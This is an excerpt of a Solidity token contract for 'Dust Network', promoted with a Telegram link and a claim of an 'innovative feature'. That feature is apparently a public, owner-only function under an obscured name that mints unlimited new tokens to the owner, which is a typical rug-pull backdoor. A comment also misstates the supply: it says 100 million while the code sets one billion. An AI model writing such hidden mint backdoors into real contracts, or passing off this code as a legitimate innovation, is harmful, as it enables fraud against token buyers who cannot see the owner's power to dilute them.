...
//
// $DustNetwork proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/DustNetwork
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _DustNetwork(uint256 amount) public onlyOwner {
 _DustNetwork(msg.sender, amount);
    }
    ...
    function _DustNetwork(address account, uint256 amount) internal virtual {
...
contract $DustNetwork is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Dust Network", "DUSTNETWORK") {
     _DustNetwork(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}